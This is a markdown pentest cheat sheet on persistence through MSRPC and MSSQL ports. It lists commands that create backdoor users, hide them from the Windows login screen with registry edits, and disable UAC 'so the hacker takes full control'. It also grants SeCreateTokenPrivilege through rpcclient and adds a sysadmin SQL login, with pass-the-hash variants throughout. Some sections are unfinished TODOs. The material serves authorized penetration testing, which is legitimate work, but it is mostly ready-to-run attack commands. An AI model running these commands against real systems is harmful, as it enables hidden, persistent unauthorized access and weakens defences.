# Unix Shell

## 01 - MSRPC Port

### 1.1 - `net`

Create user

```
$ net <ads | rpc> user add "sysadmin" "s3cur3d+1T" [-F user flags] [-C comment] -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> user add "sysadmin" "s3cur3d+1T" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

Create group

```
$ net <ads | rpc> groupmember add <group_name> <remote_username> -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> groupmember add <group_name> <remote_username> -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

### 1.2 - Impacket

Makes the user account invisible from the Windows Login screen

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -v sysadmin -vt REG_DWORD -vd 0

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -v sysadmin -vt REG_DWORD -vd 0
```

Persistence method to add user account

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -v MS_BACKUP -vt REG_DWORD -vd 0

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -v MS_BACKUP -vt REG_DWORD -vd 0
```

Disabling UAC that allows the hacker to take full control

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -v EnableLUA -vt REG_DWORD -vd 0

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -v EnableLUA -vt REG_DWORD -vd 0
```

Enabling UAC to make the admin restrictive

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -v EnableLUA -vt REG_DWORD -vd 1

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -v EnableLUA -vt REG_DWORD -vd 1
```

### 1.2 - `rpcclient`

Create domain user account

```
rpcclient $> createdomuser <username>

rpcclient $> setuserinfo2 <username> <level> <password>

rpcclient $> setuserinfo2 <username> 23 <password>

rpcclient $> setuserinfo2 <username> 24 <password>
```

Confirm the created user account exists.

```
rpcclient $> queryuser <username>
```

TODO: Fill this info

- LSA create account

```
rpcclient $> lsaenumsid

rpcclient $> lookupsids S-1-1-0
```

Lookup username accounts

```
rpcclient $> lookupnames <username>

rpcclient $> lsacreateaccount S-1-1-0
```

Lookup privileges

```
rpcclient $> enumprivs

rpcclient $> lsaaddpriv S-1-1-0 SeCreateTokenPrivilege

rpcclient $> lsaenumprivsaccount S-1-1-0
```

Delete then check

```
rpcclient $> lsadelpriv S-1-1-0 SeCreateTokenPrivilege

rpcclient $> lsaenumprivsaccount S-1-1-0
```

```
lsaaddacctrights S-1-5-21-3232368669-2512470540-2741904768-1103 SeCreateTokenPrivilege

lsaenumprivsaccount S-1-5-21-3232368669-2512470540-2741904768-1103

lsaremoveacctrights S-1-5-21-3232368669-2512470540-2741904768-1103 SeCreateTokenPrivilege

lsaenumprivsaccount S-1-5-21-3232368669-2512470540-2741904768-1103
```

## 02 - MSSQL Port

TODO: Fill this info

### 2.1 - SQSH

```
C:\> sqlcmd [-S <IP>] -E -Q

CREATE LOGIN <username> WITH PASSWORD = '<password>';
sp_addsrvrolemember '<username>', 'sysadmin';
go
```

### 2.2 - Impacket

```
$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>:<password>@<IP>

$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>@<IP> -hashes :<nt_hash>
```

### 2.3 - NetExec

```
$ netexec mssql -u "<username>" -p "<password>" [-d <domain> | --local-auth]

$ netexec mssql -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth]
```

---
## References

### Microsoft

- [Microsoft Open Specification: USER_INFORMATION_CLASS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)

### Hacktricks

- [Hacktricks: Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html)